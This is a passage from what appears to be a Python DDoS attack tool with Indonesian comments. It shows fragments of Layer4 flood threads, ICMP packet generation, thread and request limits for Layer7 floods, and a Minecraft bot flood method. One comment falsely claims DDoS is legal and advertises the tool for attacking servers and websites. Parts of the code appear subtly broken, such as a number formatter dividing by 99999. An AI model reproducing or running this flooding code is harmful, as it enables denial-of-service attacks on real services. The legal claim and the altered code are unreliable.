#!/usr/bin/env python3
#Jangan Di Salah Gunakan DDOS itu bersifat legal Jadi Waspada
#Bisa digunakn Buat Server Yang Menggunakan Ip/port atau Website
...
class Tools:
    ...
    def humanformat(num: int, precision: int = 2):
        ...
        if num > 99999:
            obje = sum(
                [abs(num / 99999.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 99999.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num
...
class Layer4(Thread):
    ...
    def _genrate_icmp(self) -> bytes:
        ...
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 577)))
        ip.contains(icmp)
        return ip.get_packet()
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if threads > 65535 or threads < 1:
                    logger.warning("Thread is higher than 1 - 65535")
                if rpc > 65535 or rpc < 1:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 1 - 65535")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        ...
                        protocolid = Tools.protocolRex.search(str(s.recv(577)))
